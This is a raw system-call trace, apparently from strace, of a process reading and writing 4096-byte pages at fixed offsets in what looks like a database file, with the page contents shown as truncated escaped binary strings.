read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\4v\\3\\17\\207\\16\\316\\4v\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\1\\21\\16\\313"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\6\\2\\362\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
write(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
write(3, "\ \\16\\316\\0\\v\\2\\33\\3\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\3\\242\\16\\366\\3)\\2\\33\\16\\313"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\16\\316\\0\\v\\2\\33\\3\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\3\\242\\16\\366\\3)\\2\\33\\16\\313"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\16\\316\\0\\v\\2\\33\\3\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\3\\242\\16\\366\\3)\\2\\33\\16\\313"..., 4096) = 4096
brk( ) =
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\16\\316\\0\\v\\2\\33\\3\\v\\241\\v\ \ \\223\\t~\\10y\\6\\355\\4\\326\\3\\242\\16\\366\\3)\\2\\33\\16\\313"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
write(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
write(3, "\ \\0\\0\\0\ \\0g\\0\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\3t\\2f\\1\\21"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\0g\\0\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\3t\\2f\\1\\21"..., 4096) = 4096
brk( ) =
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\0g\\0\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\3t\\2f\\1\\21"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\0g\\0\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\3t\\2f\\1\\21"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\t\\1@\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
write(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
write(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
write(3, "\ \\0\\0\\0\\7\\7\\312\\0\\17\\"\\16e\ v\\f\\363\\t\\354\\10\\223\\7\\312\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
write(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 24576, seek_set) = 24576
read(3, "\ \\0\\0\\0\\7\\7\\312\\0\\17\\"\\16e\ v\\f\\363\\t\\354\\10\\223\\7\\312\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\ \\0031\\0\\17\\207\\16y\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\\v\\2\\224\\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\1\\21"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
write(3, "\ \\0\\0\\0\ \\1\ \\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
write(3, "\ \\v\\207\\0\\17\\2b\\0\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372\\0031\\v\\234"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
read(3, "\ \\0\\0\\0\\7\\2y\\0\\17k\\16\\306\\16\\32\ \\206\\f\\211\\2\\362\\2y\\1\\300\\1@\\0018\\0\\0\\0\\0"..., 4096) = 4096
lseek(3, 16384, seek_set) = 16384
read(3, "\ \\0\\0\\0\ \\1\ \\0\\3\\24\\2\\224\\f\\326\\f?\\v\\310\ \\263\\t\\256\\10\\"\\6\\v\\4\\327\\3\\315\\2\\33"..., 4096) = 4096
lseek(3, 20480, seek_set) = 20480
read(3, "\ \\v\\207\\0\\17\\2b\\0\ d\\fz\ \\236\\t\\275\\10\\360\\10)\\6\\372\\6\ \\5e\\3\\372\\0031\\v\\234"..., 4096) = 4096
lseek(3, 4096, seek_set) = 4096
read(3, "\ \\0\\0\\0\\20\\1\\32\\0\\17\\201\\16\\241\\16\\22\ -\ b\\t\\221\\10\\222\\7\\365\\0070\\5\\253\\4\\367\\4g"..., 4096) = 4096
lseek(3, 8192, seek_set) = 8192
read(3, "\ \\0\\0\\0\\f\\0^\\0\\f\\355\\v\\346\\vi\ \\331\ =\\t\\224\\10\\34\\6\\373\\6\\215\\5\\224\\1\\335\\0^"..., 4096) = 4096
lseek(3, 12288, seek_set) = 12288
